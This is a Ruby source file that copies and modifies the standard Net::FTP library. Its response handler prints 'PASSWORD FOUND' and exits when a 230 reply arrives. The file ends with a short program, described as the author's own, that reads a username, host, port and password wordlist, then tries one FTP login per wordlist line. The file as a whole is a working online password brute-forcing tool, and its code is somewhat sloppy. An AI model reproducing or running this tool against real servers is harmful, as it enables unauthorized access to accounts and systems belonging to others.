
require "socket"
require "monitor"

module Net

  class FTPError < StandardError; end
  class FTPReplyError < FTPError; end
  class FTPTempError < FTPError; end 
  class FTPPermError < FTPError; end 
  class FTPProtoError < FTPError; end
 
  class FTP
    include MonitorMixin
    
    # :stopdoc:
    FTP_PORT = 21
    CRLF = "\r\n"
    DEFAULT_BLOCKSIZE = 4096
    # :startdoc:
    
    # When +true+, transfers are performed in binary mode.  Default: +true+.
    attr_accessor :binary

    # When +true+, the connection is in passive mode.  Default: +false+.
    attr_accessor :passive

    # When +true+, all traffic to and from the server is written
    # to +$stdout+.  Default: +false+.
    attr_accessor :debug_mode

    # Sets or retrieves the +resume+ status, which decides whether incomplete
    # transfers are resumed or restarted.  Default: +false+.
    attr_accessor :resume

    # The server's welcome message.
    attr_reader :welcome

    # The server's last response code.
    attr_reader :last_response_code
    alias lastresp last_response_code

    # The server's last response.
    attr_reader :last_response
    
    #
    # A synonym for <tt>FTP.new</tt>, but with a mandatory host parameter.
    #
    # If a block is given, it is passed the +FTP+ object, which will be closed
    # when the block finishes, or when an exception is raised.
    #
    def FTP.open(host, user = nil, passwd = nil, acct = nil)
      if block_given?
        ftp = new(host, user, passwd, acct)
        begin
          yield ftp
        ensure
          ftp.close
        end
      else
        new(host, user, passwd, acct)
      end
    end
    
    #
    # Creates and returns a new +FTP+ object. If a +host+ is given, a connection
    # is made. Additionally, if the +user+ is given, the given user name,
    # password, and (optionally) account are used to log in.  See #login.
    #
    def initialize(host = nil, user = nil, passwd = nil, acct = nil)
      super()
      @binary = true
      @passive = false
      @debug_mode = false
      @resume = false
      if host
	connect(host)
	if user
	  login(user, passwd, acct)
	end
      end
    end

  
   
    # Obsolete
    def return_code=(s)
      $stderr.puts("warning: Net::FTP#return_code= is obsolete and do nothing")
    end

    def open_socket(host, port)
      if defined? SOCKSsocket and ENV["SOCKS_SERVER"]
	@passive = true
	return SOCKSsocket.open(host, port)
      else
	return TCPSocket.open(host, port)
      end
    end
    private :open_socket
    
    
    # Establishes an FTP connection to host, optionally overriding the default
    # port. If the environment variable +SOCKS_SERVER+ is set, sets up the
    # connection through a SOCKS proxy. Raises an exception (typically
    # <tt>Errno::ECONNREFUSED</tt>) if the connection cannot be established.
    
    def connect(host, port = FTP_PORT)
      if @debug_mode
	print "connect: ", host, ", ", port, "\n"
      end
      synchronize do
	@sock = open_socket(host, port)
	voidresp
      end
    end
    
    
    def putline(line)
      if @debug_mode
	print "put: ", sanitize(line), "\n"
      end
      line = line + CRLF
      @sock.write(line)
    end
    private :putline
    
    def getline
          begin
            line = @sock.readline # if get EOF, raise EOFError
          rescue EOFError
            raise FTPProtoError, "Connection closed unexpectedly"
          end
          line.sub!(/(\r\n|\n|\r)\z/n, "")
          if @debug_mode
            print "get: ", sanitize(line), "\n"
          end
          return line
        end
        private :getline
    
    def getmultiline
      line = getline
      buff = line
      if line[3] == ?-
	  code = line[0, 3]
	begin
	  line = getline
	  buff << "\n" << line
	end until line[0, 3] == code and line[3] != ?-
      end
      return buff << "\n"
    end
    private :getmultiline
    
    def getresp
      @last_response = getmultiline
      @last_response_code = @last_response[0..5]
     
      
      if @last_response[0..2] == "230"
        puts "PASSWORD FOUND"
        exit
      end 
  
      case @last_response_code
      when /\A1/
	return @last_response 
      when /\A2/
  return @last_response 
      when /\A3/
  return @last_response 
      when /\A4/
      when /\A5/
        puts "530 Login Incorrect: PASSWORD NOT FOUND"
  
      else
	raise FTPProtoError, @last_response
      end
    end
    
    private :getresp
    
    
    def voidresp
      resp = getresp
      if resp[0] != ?2
	raise FTPReplyError, resp
      end
    end
    private :voidresp
    
    
    # Sends a command and returns the response.
    def sendcmd(cmd)
      synchronize do
	putline(cmd)
	return getresp
      end
    end
    
    
    # Sends a command and expect a response beginning with '2'.
    def voidcmd(cmd)
      synchronize do
	putline(cmd)
	voidresp
      end
    end
    
  
    # Logs in to the remote host. 
    def login(user = "anonymous", passwd = nil, acct = nil)
      if user == "anonymous" and passwd == nil
        passwd = getaddress
      end
      
      resp = ""
      synchronize do
	      resp = sendcmd('USER ' + user)
	      if resp[0] == ?3
	        resp = sendcmd('PASS ' + passwd)   
        end
      end
      
      @welcome = resp
      
    end
    
    def chdir(dirname)
      if dirname == ".."
	begin
	  voidcmd("CDUP")
	  return
	rescue FTPPermError
	  if $![0, 3] != "500"
	    raise FTPPermError, $!
	  end
	end
      end
      cmd = "CWD " + dirname
      voidcmd(cmd)
    end
    
    # Creates a remote directory.
    def mkdir(dirname)
      resp = sendcmd("MKD " + dirname)
      return parse257(resp)
    end
    
    
    # Removes a remote directory.
    def rmdir(dirname)
      voidcmd("RMD " + dirname)
    end
    

    def quit
      voidcmd("QUIT")
    end
  
    # Closes the connection.  Further operations are impossible until you open
    # a new connection with #connect.
    def close
      @sock.close if @sock and not @sock.closed?
    end
  end
end


#Here is the program I wrote: 

puts "Please enter a user name?"
user_name = gets.chomp.to_s


puts "Please enter a host: "
ip_address = gets.chomp.to_s

puts "Please enter a port: "
port = gets.chomp.to_i

puts "\n"

puts "USER NAME: #{user_name}"
puts "IP ADDRESS: #{ip_address}"
puts "PORT: #{port}"
puts "\n"


puts "Please enter a text file: "
password = gets.chomp.to_s

File.open(password).each do |line|
  ftp=Net::FTP.new
  ftp.connect(ip_address, port)
  puts "Trying Username: #{user_name} Password: #{line}"
  ftp.login(user_name,line)
   
end



  







        
        
